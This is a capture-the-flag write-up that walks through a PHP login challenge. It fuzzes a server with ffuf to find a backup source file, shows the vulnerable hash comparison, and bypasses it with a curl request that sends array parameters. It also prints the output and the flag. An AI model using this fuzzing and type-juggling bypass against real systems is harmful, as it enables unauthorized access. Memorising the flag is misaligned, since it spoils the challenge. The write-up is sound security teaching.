# Web Exotic Attacks Breaking Hashes

The HTML page hints at a file source.phar in a comment, suggesting source code might be accessible. Direct access to source.phar returns 404 (not found).

Using SecLists [https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt) for fuzzing, we search for hidden files and backups:

```bash
ffuf -u http://141.85.224.99:8000/FUZZ -w SecLists/Discovery/Web-Content/common.txt -e .php,.bak,.zip,.tar.gz,.phar -mc 200
```

This revealed a backup file: **source.bak**. Downloading and opening source.bak shows the authentication logic:

```php
if (isset($_POST['username']) && isset($_POST['password'])) {
    if ($_POST['username'] == $_POST['password']) {
        $error = 'Your password can not be your username!';
    } else if (hash('sha256', $_POST['username']) === hash('sha256', $_POST['password'])) {
        die($flag);
    } else {
        $error = 'Invalid credentials!';
    }
}
```

The code requires different username and password but with identical SHA-256 hashes. Finding a real SHA-256 collision is practically impossible. But the code doesn't validate input types before hashing. By submitting array inputs instead of strings, we cause hash() to throw warnings but the flag is revealed:

```bash
curl -s http://141.85.224.99:8000/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'username[]=""&password[]=&submit=Login'
```

This revealed the flag: **SSS{arr4ys_c4n_b3_n4sty_if_n0t_ch3ck3d}**

```bash
ndrei@DESKTOP-52JT2BC:~$ curl -s http://141.85.224.99:8000/ -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username[]=""&password[]=&submit=Login'
<br />
<b>Warning</b>:  hash() expects parameter 2 to be string, array given in <b>/var/www/html/index.php</b> on line <b>10</b><br />
<br />
<b>Warning</b>:  hash() expects parameter 2 to be string, array given in <b>/var/www/html/index.php</b> on line <b>10</b><br />
SSS{arr4ys_c4n_b3_n4sty_if_n0t_ch3ck3d}
```
